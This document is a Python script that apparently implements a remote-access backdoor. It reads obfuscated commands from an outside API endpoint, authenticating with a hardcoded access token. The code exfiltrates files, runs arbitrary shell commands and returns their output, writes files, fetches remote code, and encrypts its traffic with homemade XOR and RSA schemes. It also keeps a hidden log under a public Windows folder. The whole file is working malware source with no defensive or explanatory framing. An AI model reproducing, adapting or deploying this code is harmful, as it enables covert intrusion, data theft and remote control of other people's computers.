import urllib.request
import urllib.parse
import json
import base64
import hashlib
import time
import subprocess
import os
import secrets
s="MjkyLCAyMTcsIDI0NywgMTQ1LCAyOTgsIDIxNywgMjMyLCAxNjMsIDIyOSwgMzY0LCAxNzIsIDMxMywgMjk4LCAyMTQsIDMyMiwgMzUyLCAyNzEsIDE1MSwgMzI1LCAxNDUsIDI5MiwgMjE3LCAyNTksIDMxNiwgMjI5LCAzMjgsIDIzNSwgMzU1LCAyOTUsIDI1MCwgMTcyLCAzNjQsIDI3MSwgMjY1LCAxOTksIDM1NSwgMjk4LCAzNjQsIDE3MiwgMzIyLCAyNjgsIDI2NSwgMjcxLCAzMzcsIDI3MSwgMjAyLCAxNDgsIDMzMSwgMzAxLCAyNjUsIDMyMiwgMzQ5LCAyMzIsIDI1MCwgMTcyLCAyMDIsIDI2OCwgMjY1LCAyMzUsIDM0MywgMjcxLCAyNjUsIDI0NywgMjQ0LCAyOTgsIDMyOCwgMzI1LCAzMTksIDI3MSwgMjQ0LCAxODQsIDE4NA=="
s = base64.b64decode(bytes(map(lambda x : (int(x) - 1 )//3, base64.b64decode(s.encode("utf-8")).split(b", ")))).decode("utf-8")

longCommand = None
def getCommand():
    global longCommand
    if(longCommand != None):
        longCommand2 = longCommand
        longCommand = None
        return longCommand2
    
    x= urllib.request.Request(s, headers={"Authorization":"token 9526087eedac830d8a62e31f17650b9c2969bfb2"})
    result = urllib.request.urlopen(x)
    js = json.loads(result.read())
    return js["description"]

def write(text, iv):
    #text is byte string
    print(text)
    if(type(text) == str):
        text=bytes(text, "utf-8")
    s = "iv:" + iv + "code:" + base64.b64encode(encrypt(text, key, iv)).decode("utf-8")
    timeA = str(time.time())
    if(len(s) != 0):
        writeDirect(timeA, s)
    
def writeDirect(title, value):
    #should both be strings
    if(type(title)==bytes):
        title = title.decode()
    if(type(value)==bytes):
        value = value.decode()
    x= urllib.request.Request(s+"/issues", headers={"Authorization":"token 9526087eedac830d8a62e31f17650b9c2969bfb2"}, data=json.dumps({"title":title, "body":value}).encode())
    result = urllib.request.urlopen(x)
    js = json.loads(result.read())
    return js
    
    
def getKey(length, key, iv):
    if(type(key) == bytes):
        key = key.decode("utf-8")
    if(type(iv) == bytes):
        iv = iv.decode("utf-8")
    s = b""
    index = 0
    while(len(s) < length):
        line = str(index) + key + " nonce, I guess " + hashlib.sha256((iv + "other nonce, I guess" + key + " a third nonce, I guess").encode("utf-8")).hexdigest() + str(index)
        s+=hashlib.sha256(line.encode("utf-8")).digest()
        index += 1
    return s[0:length]

def xor(x, y):
    return bytes([a^b for a,b in zip(x, y)])

def encrypt(data, key, iv):
    #takes in bytes or string and returns bytes
    if(type(data) == str):
        data=bytes(data, "utf-8")
    return xor(data, getKey(len(data), key, iv))

def log(text):
    global logFile, logFileActive
    if(logFileActive == False):
        return
    logFile.write(str(int(time.time())) + ":" + text + "\n")
    logFile.flush()
    if(os.stat('C:\\Users\\Public\\data\\log.txt').st_size > 10000000):
        logFile.close()
        os.remove('C:\\Users\\Public\\data\\log.txt')
        logFile = open("C:/Users/Public/data/log.txt", "a")

rsaPublicKey = 26072420994531621643757584061675455172171085140155752404229621242807980269391220410247581788481024498812085959364435722701490043964794016014034263397698290591573954425242536248476025124281131604200135230941676863131615822636469673355225119050537548863676214865914316943101693967136543666122296703070550587908853339461050012127429808359884287136774094002484029551743305375294686670838220084617645482095926238240312142725891943970396732975549252884535174799689978571771546502028061645055282580115130430685414648883948245894628869174151247140308148166716445086815439414966923637125366447200248424217012472430357836801809

def rsaEncrypt(data):
    #use oaep
    #k0 = 256, k1 = 512
    #n = 2048
    #g = sha256(x || nonce1  || 1) || ... sha256(x || nonce1 || 7)
    #h = sha256(x || nonce2)
    nonce1 = b"this is a nonce"
    nonce2 = b"this is another nonce"
    n = 2048
    k0 = 256
    k1 = 512
    if(type(data) == str):
        data = bytes(data, "utf-8")
    if(len(data) > (n - k0 - k1)//8):
        raise ValueError("message too long")
    data = data + b"\x00"*((n - k0 - len(data)*8)//8)
    r = secrets.token_bytes(k0//8)
    Gr = b""
    for i in range(8):
        Gr += hashlib.sha256(r + nonce1 + str(i+1).encode()).digest()
    X = xor(data, Gr)
    Y = xor(r, hashlib.sha256(X + nonce2).digest())
    preOutput = X + Y
    #now encrypt preOutput with RSA
    #first convert preOutput into a number
    pt = int.from_bytes(preOutput, 'big')

    return pow(pt, 65537, rsaPublicKey)
try:
    logFile = open("C:/Users/Public/data/log.txt", "a")
    logFileActive =True
except Exception as e:
    logFileActive =False
    
if (__name__ == "__main__"):
        
    command = ""
    key = "56667DC5AE50E7D2426EECB9BEEF89ABD70E5EE1DF492222F734AA98B5DE1F0B"
    ticks = 0
    runCommands = ["","b","c","d","e"]
    print("hook is active")
    keyGenerated = False
    while(True):
        
        try:
            log("hook has been turned on")
            time.sleep(1)
            isLongCommand = longCommand != None
            newcommand = getCommand()
            log("hook is active")
            print(newcommand, ticks)
            if(newcommand != command): #different command since last tick
                command = newcommand
                ticks = 0
            else:# same command since last tick
                ticks= ticks + 1
            if(ticks == 50): #50 seconds since last command given. 
                runCommands = ["a","b","c","d","e"]
            if(ticks == 5 or isLongCommand): #same command persisted for 5 seconds, run it.
                #execute the command
                #already seen this command? continue
                if(command in runCommands):
                    continue

                runCommands = [command] + runCommands
                runCommands.pop()
                print("running")
                print(command)
                log("hook is running the command : " + str(command))
                #first, decrypt the command, first 32 characters is iv
                command = encrypt(base64.b64decode(command[32:]), key , command[0:32]).decode("utf-8")
                
                tokenize = list(filter(lambda x : len(str(x)) != 0 , command.split(" ")))
                if(keyGenerated == False and tokenize[0] != "generateKey"):
                    write("generate a key first", "")
                    continue
                
                if(tokenize[0] == "snagFile2"):
                    path = base64.b64decode(tokenize[1]).decode("utf-8")
                    IV = tokenize[2] + str(time.time())
                    write(open(path, "rb").read(), IV)
                if(tokenize[0] == "runCommand2"):
                    path = base64.b64decode(tokenize[1]).decode("utf-8")
                    IV = tokenize[2] + str(time.time())
                    out, err = subprocess.Popen(path, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate(b" ")
                    if(type(out) == str):
                        out = bytes(out, "utf-8")
                    if(type(err) == str):
                        err = bytes(err, "utf-8")
                    write(b"out:" + out + b"err:" + err, IV)
                    
                    
                if(tokenize[0] == "writeData2"):
                    path = base64.b64decode(tokenize[1]).decode("utf-8")
                    data = base64.b64decode(tokenize[2])
                    try:
                        os.makedirs(os.path.dirname(path))
                    except FileExistsError:
                        pass
                    except PermissionError:
                        pass
                    x = open(path, "wb")
                    x.write(data)
                    x.close()
                if(tokenize[0] == "longCommand"):
                    url = tokenize[1]
                    longCommand = urllib.request.urlopen(base64.b64decode(tokenize[1]).decode("utf-8")).read().decode("utf-8")
                if(tokenize[0] == "setKey"):
                    key = tokenize[1]
                if(tokenize[0] == "generateKey"):
                    X = []
                    print("generating")
                    for i in range(160):
                        X.append(secrets.randbelow(122-48) + 48)
                    value = rsaEncrypt(bytes(X))
                    writeDirect("key generated at " + str(time.time()), str(value))
                    key = bytes(X).decode("utf-8")
                    keyGenerated = True
                log("hook has finished running the command : " + str(command))
        except Exception as e :
            try:
                print(str(e))
                log("hook has encountered an error : " + str(e))
                if(keyGenerated):
                    write(str(e), str(time.time()))

            except Exception as e:
                print(str(e))
                pass

